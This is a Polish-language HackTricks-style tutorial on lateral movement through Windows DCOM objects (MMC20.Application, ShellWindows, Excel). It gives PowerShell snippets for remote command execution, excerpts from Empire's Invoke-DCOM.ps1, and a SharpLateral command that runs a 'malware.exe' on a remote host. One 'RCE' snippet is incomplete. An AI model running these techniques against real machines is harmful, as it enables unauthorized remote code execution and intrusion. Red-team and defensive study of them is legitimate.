# DCOM Exec

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby szybko je naprawić. Intruder śledzi powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**Aby uzyskać więcej informacji na temat tej techniki, sprawdź oryginalny post na stronie [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**


Rozproszony Model Obiektów Składnikowych (DCOM) oferuje interesujące możliwości interakcji sieciowych z obiektami. Microsoft udostępnia obszerną dokumentację zarówno dla DCOM, jak i dla Modelu Obiektowego Składnikowego (COM), dostępną [tutaj dla DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [tutaj dla COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Listę aplikacji DCOM można uzyskać za pomocą polecenia PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Obiekt COM, [Klasa aplikacji MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), umożliwia skryptowanie operacji wtyczek MMC. Warto zauważyć, że ten obiekt zawiera metodę `ExecuteShellCommand` w ramach `Document.ActiveView`. Więcej informacji na temat tej metody można znaleźć [tutaj](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Sprawdź to uruchamiając:

Ta funkcja ułatwia wykonywanie poleceń przez sieć za pośrednictwem aplikacji DCOM. Aby zdalnie korzystać z DCOM jako administrator, można użyć PowerShella w następujący sposób:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ten polecenie łączy się z aplikacją DCOM i zwraca instancję obiektu COM. Metoda ExecuteShellCommand może być następnie wywołana, aby uruchomić proces na zdalnym hoście. Proces obejmuje następujące kroki:

Sprawdź metody:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Uzyskaj zdalne wykonanie kodu (RCE):
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Aby uzyskać więcej informacji na temat tej techniki, sprawdź oryginalny post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Zidentyfikowano obiekt **MMC20.Application**, który nie ma jawnie zdefiniowanych "LaunchPermissions" i domyślnie ma uprawnienia umożliwiające dostęp administratorom. Aby uzyskać więcej szczegółów, można przejrzeć wątek [tutaj](https://twitter.com/tiraniddo/status/817532039771525120), a zaleca się korzystanie z narzędzia [@tiraniddo](https://twitter.com/tiraniddo) OleView .NET do filtrowania obiektów bez jawnie zdefiniowanych uprawnień uruchamiania.

Wskazano dwa konkretne obiekty, `ShellBrowserWindow` i `ShellWindows`, które nie mają jawnie zdefiniowanych uprawnień uruchamiania. Brak wpisu `LaunchPermission` w rejestrze pod ścieżką `HKCR:\AppID\{guid}` oznacza brak jawnie zdefiniowanych uprawnień.

###  ShellWindows
Dla obiektu `ShellWindows`, który nie ma ProgID, metody .NET `Type.GetTypeFromCLSID` i `Activator.CreateInstance` ułatwiają tworzenie obiektu za pomocą jego AppID. Proces ten wykorzystuje OleView .NET do pobrania CLSID dla `ShellWindows`. Po utworzeniu obiektu możliwa jest interakcja za pomocą metody `WindowsShell.Item`, co prowadzi do wywoływania metod, takich jak `Document.Application.ShellExecute`.

Przedstawiono przykładowe polecenia PowerShell do utworzenia obiektu i zdalnego wykonania poleceń:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Przemieszczanie się po bokach za pomocą obiektów DCOM Excel

Przemieszczanie się po bokach można osiągnąć, wykorzystując obiekty DCOM Excel. Aby uzyskać szczegółowe informacje, zaleca się zapoznanie się z dyskusją na temat wykorzystania DDE Excela do przemieszczania się po bokach za pośrednictwem DCOM na [blogu Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Projekt Empire udostępnia skrypt PowerShell, który demonstruje wykorzystanie Excela do zdalnego wykonania kodu (RCE) poprzez manipulację obiektami DCOM. Poniżej znajdują się fragmenty skryptu dostępne w [repozytorium GitHub Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), prezentujące różne metody nadużywania Excela do RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Narzędzia automatyzujące ruch boczny

Wyróżnia się dwa narzędzia do automatyzacji tych technik:

- **Invoke-DCOM.ps1**: Skrypt PowerShell dostarczony przez projekt Empire, który upraszcza wywoływanie różnych metod wykonania kodu na zdalnych maszynach. Ten skrypt jest dostępny w repozytorium GitHub projektu Empire.

- **SharpLateral**: Narzędzie przeznaczone do zdalnego wykonywania kodu, które można użyć za pomocą polecenia:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Narzędzia automatyczne

* Skrypt Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) umożliwia łatwe wywoływanie wszystkich skomentowanych sposobów wykonywania kodu na innych maszynach.
* Możesz również użyć [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Odwołania

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Znajdź najważniejsze podatności, aby szybko je naprawić. Intruder śledzi Twoją powierzchnię ataku, wykonuje proaktywne skanowanie zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj go za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów GitHub.**

</details>
